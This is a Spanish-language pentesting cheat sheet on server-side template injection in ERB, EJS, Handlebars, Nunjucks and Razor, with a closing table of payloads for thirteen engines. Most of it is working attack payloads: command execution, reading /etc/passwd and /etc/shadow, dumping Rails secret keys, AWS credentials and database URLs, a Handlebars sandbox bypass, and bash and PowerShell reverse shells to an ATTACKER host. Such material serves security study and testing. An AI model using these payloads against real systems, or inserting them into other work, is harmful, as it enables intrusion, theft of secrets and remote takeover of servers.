# Otros motores (ERB, EJS, Handlebars, Nunjucks, Razor)

### ERB (Ruby)

ERB (Embedded Ruby) es el motor de plantillas por defecto de Ruby on Rails. También lo usa Sinatra y scripts Ruby en general. Es especialmente relevante porque Rails es muy popular en startups y aplicaciones web.

```ruby
# Código vulnerable (Ruby/Sinatra)
get '/greet' do
  name = params[:name]
  ERB.new("Hola #{name}").result   # ← string interpolation directa = vulnerable
end

# También vulnerable:
ERB.new("Hola " + params[:name]).result
```

#### Confirmación ERB

```ruby
<%= 7*7 %>       → 49
<%= 'test' %>    → test
<%= 1+1 %>       → 2
```

#### ERB — Escalada a RCE

ERB tiene acceso directo a Ruby, por lo que el salto a RCE es inmediato:

```ruby
# Ejecutar comandos del sistema
<%= system("id") %>           # Ejecuta y devuelve true/false
<%= `id` %>                   # Backticks → devuelve el output ✅
<%= IO.popen('id').read %>    # Leer output via IO
<%= %x{id} %>                 # Equivalente a backticks

# Require y exec
<%= require 'open3'; Open3.capture2("id")[0] %>

# Via Kernel.exec (no devuelve, reemplaza el proceso)
<%= Kernel.system("id") %>

# Via eval (si hay doble inyección)
<%= eval("system('id')") %>

# Leer archivos
<%= File.read('/etc/passwd') %>
<%= IO.read('/etc/passwd') %>
<%= File.binread('/etc/shadow') %>

# Reverse shell
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'` %>

# Via Kernel.system
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'") %>

# Listing de directorio
<%= Dir.glob('/*') %>
<%= Dir.entries('/etc') %>

# Variables de entorno
<%= ENV.to_s %>
<%= ENV['SECRET_KEY_BASE'] %>     # Rails secret key
<%= ENV['DATABASE_URL'] %>        # Credenciales DB
```

#### ERB en Rails — Información sensible

```ruby
# Configuración de Rails
<%= Rails.application.secrets.secret_key_base %>
<%= Rails.application.config.database_configuration %>
<%= Rails.env %>

# Variables de entorno importantes
<%= ENV['RAILS_MASTER_KEY'] %>
<%= ENV['DATABASE_URL'] %>
<%= ENV['REDIS_URL'] %>
<%= ENV['AWS_ACCESS_KEY_ID'] %>
<%= ENV['AWS_SECRET_ACCESS_KEY'] %>
```

### EJS (Node.js)

EJS (Embedded JavaScript) es un motor de plantillas para Node.js. Se usa en aplicaciones Express.js y proyectos Node en general. Es menos común que Handlebars o Nunjucks pero aparece en proyectos más simples.

```javascript
// Código vulnerable (Express.js)
app.get('/greet', (req, res) => {
    const name = req.query.name;
    res.render('index', { name: name });  // Seguro si name se pasa como variable
    
    // VULNERABLE: renderizar directamente string con input
    ejs.render("Hola <%= " + name + " %>", {});
});
```

#### Confirmación EJS

```
<%= 7*7 %>      → 49
<%= process.env %>  → variables de entorno de Node
```

#### EJS — Escalada a RCE

```javascript
// Via process.mainModule
<%= process.mainModule.require('child_process').execSync('id').toString() %>
<%= process.mainModule.require('child_process').execSync('whoami').toString() %>

// Via require directamente (si está en scope)
<%= require('child_process').execSync('id').toString() %>
<%= require('child_process').exec('id', function(e,s,r){res.end(s)}) %>

// Via global
<%= global.process.mainModule.require('child_process').execSync('id') %>

// Leer archivos
<%= require('fs').readFileSync('/etc/passwd', 'utf8') %>
<%= process.mainModule.require('fs').readFileSync('/etc/passwd').toString() %>

// Variables de entorno
<%= process.env %>
<%= JSON.stringify(process.env) %>
<%= process.env.NODE_ENV %>
<%= process.env.DATABASE_URL %>

// Reverse shell
<%= process.mainModule.require('child_process').exec("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'") %>
```

### Handlebars (Node.js)

Handlebars es uno de los motores de plantillas más usados en Node.js. Lo usan aplicaciones Express.js, Ghost CMS, y muchos proyectos JavaScript. Es un caso especial porque su sandbox está diseñado para prevenir la ejecución de código arbitrario, pero tiene bypasses documentados.

#### Confirmación Handlebars

```
{{7}}           → 7            (no evalúa expresiones matemáticas)
{{this}}        → [object Object]
{{constructor}} → function Object
```

**Nota:** Handlebars intencionalmente no evalúa `{{7*7}}` como expresión matemática — devuelve vacío o el literal. Hay que buscar otros indicadores.

#### Handlebars — Bypass del sandbox

Handlebars tiene un sandbox que bloquea acceso a `__proto__`, `constructor`, etc., pero hay bypasses conocidos:

```javascript
// Bypass clásico via prototype pollution en helpers
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

// Versión simplificada para RCE
{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return process.mainModule.require('child_process').execSync('id').toString();"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

### Nunjucks (Node.js)

Nunjucks es un motor de plantillas Node.js creado por Mozilla, inspirado en Jinja2. Se usa en generadores de sitios estáticos (Eleventy, Metalsmith) y algunas aplicaciones Express.

#### Confirmación Nunjucks

```
{{7*7}}         → 49            (igual que Jinja2)
{{"test"}}      → test
{{range(1,5)}}  → 1,2,3,4
```

#### Nunjucks — Escalada a RCE

```javascript
// Via range y funciones globales (si están expuestas)
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

// Via constructor de función
{{''.__proto__.constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}

// Via cycler (similar a Jinja2)
// Nunjucks no tiene cycler integrado, pero puede tener globales custom

// Via filtros personalizados si están configurados
{{'id'|exec}}   // Si hay un filtro exec definido

// Prototype pollution en Nunjucks
{{''.__proto__}}
{{''.__proto__.constructor}}
{{''.__proto__.constructor.constructor('return process.env')()}}
```

### Razor (.NET)

Razor es el motor de plantillas de **ASP.NET Core** y **ASP.NET MVC**. Es el más común en aplicaciones .NET. Usa `@` como prefijo para código C#.

```csharp
// Código vulnerable (ASP.NET)
public IActionResult Index(string name)
{
    // SEGURO: pasar como modelo
    return View("Index", name);
    
    // Si el template se construye dinámicamente con input del usuario
    // es vulnerable a SSTI
}
```

#### Confirmación Razor

```
@(7*7)          → 49
@DateTime.Now   → fecha actual
@System.Environment.MachineName → nombre del servidor
```

#### Razor — Escalada a RCE

```csharp
// Via System.Diagnostics.Process
@{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "bash";
    proc.StartInfo.Arguments = "-c id";
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    @proc.StandardOutput.ReadToEnd()
}

// Versión compacta
@System.Diagnostics.Process.Start("bash", "-c id")

// Leer archivos
@System.IO.File.ReadAllText("/etc/passwd")
@System.IO.File.ReadAllText("C:\\Windows\\win.ini")

// Variables de entorno
@System.Environment.GetEnvironmentVariables()
@System.Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT")

// Reverse shell via PowerShell
@{
    var proc = new System.Diagnostics.ProcessStartInfo("powershell", "-c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',9001);...\"");
    proc.UseShellExecute = false;
    System.Diagnostics.Process.Start(proc);
}
```

| Motor          | Lenguaje  | Delimitadores    | Payload de confirmación | Payload RCE                                                                            |
| -------------- | --------- | ---------------- | ----------------------- | -------------------------------------------------------------------------------------- |
| **Jinja2**     | Python    | `{{ }}` `{% %}`  | `{{7*'7'}}` → 7777777   | `{{cycler.__init__.__globals__.os.popen('id').read()}}`                                |
| **Twig**       | PHP       | `{{ }}` `{% %}`  | `{{7*'7'}}` → 49        | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| **Smarty**     | PHP       | `{ }`            | `{$smarty.version}`     | `{if system('id')}{/if}`                                                               |
| **Mako**       | Python    | `${ }` `<% %>`   | `${7*7}` → 49           | `${__import__('os').popen('id').read()}`                                               |
| **Freemarker** | Java      | `${ }` `<#>`     | `${.version}`           | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`                  |
| **Velocity**   | Java      | `$var` `#dir`    | `#set($x=7)${x}`        | Via `$class.forName("java.lang.Runtime")`                                              |
| **Pebble**     | Java      | `{{ }}` `{% %}`  | `{{7*7}}` → 49          | Via `"".class.forName("java.lang.ProcessBuilder")`                                     |
| **Thymeleaf**  | Java      | `*{ }` `${ }`    | `*{7*7}` → 49           | `${T(java.lang.Runtime).getRuntime().exec('id')}`                                      |
| **ERB**        | Ruby      | `<%= %>` `<% %>` | `<%= 7*7 %>`            | ``<%= `id` %>``                                                                        |
| **EJS**        | Node.js   | `<%= %>` `<% %>` | `<%= 7*7 %>`            | `<%= require('child_process').execSync('id').toString() %>`                            |
| **Handlebars** | Node.js   | `{{ }}` `{{# }}` | `{{this}}`              | Via prototype chain bypass                                                             |
| **Nunjucks**   | Node.js   | `{{ }}` `{% %}`  | `{{7*7}}` → 49          | Via `range.constructor(...)()`                                                         |
| **Razor**      | .NET (C#) | `@( )` `@{ }`    | `@(7*7)` → 49           | `@System.IO.File.ReadAllText(...)`                                                     |

> ERB (Ruby) es el más sencillo de explotar: `` `comando` `` ejecuta directamente en el sistema. Si encuentras ERB, el salto a RCE es trivial con una sola línea.

> Handlebars es el más complicado porque tiene sandbox, pero el bypass via prototype chain funciona en versiones sin parche. Siempre verificar la versión antes de intentarlo.

> Nunjucks y Jinja2 comparten sintaxis `{{ }}` pero son ecosistemas completamente diferentes (Node.js vs Python). Si `cycler.__init__.__globals__` no funciona pero la app usa Node.js, es Nunjucks — usar el bypass de `range.constructor`.
